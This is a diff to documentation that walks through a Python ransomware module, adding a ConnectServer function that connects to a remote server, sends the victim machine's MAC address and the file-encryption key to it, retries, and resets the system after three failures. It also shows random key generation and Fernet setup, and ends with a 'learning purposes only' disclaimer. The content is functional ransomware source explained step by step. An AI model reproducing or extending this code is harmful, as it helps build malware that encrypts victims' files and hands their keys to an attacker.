@@ -21,6 +21,26 @@ This Python module implements a simple ransomware that connects to a server, enc
         self.server: socket = socket(AF_INET, SOCK_STREAM)
         self.Private = Fernet(self.key)
     ```
-Generate a random encryption key. Initialize System object. Create a socket for communication and a Fernet instance for encryption/decryption 
+- Generate a random encryption key, initialize System object. 
+- Create a `socket` for communication and a `Fernet` instance for encryption/decryption.
+
+    ```python
+    def ConnectServer(self, connected = False) -> None:
+        retries = 0
+        while not connected and retries < 3:
+            try:
+                self.server.connect((self.host, self.port))
+                self.server.sendall(f'{self.system.Mac()}|{self.key.decode("utf-8")}'.encode('utf-8'))
+                connected = True
+            except:
+                retries += 1
+                if retries < 3:
+                    sleep(10)
+                else:
+                    System.reset()
+            finally:
+                self.server.close()
+    ```
+Connect to the server, send mac information and encryption key to the server. Retry the connection after 10 seconds, restart the system if the connection fails after 3 attempts.Sending information to the server successfully, closes the connection.
 
 Please note: This code should only be used for learning purposes. Using it to perform illegal activities (such as cyber attacks) can lead to serious legal consequences. Always comply with legal regulations when using and developing open source code.
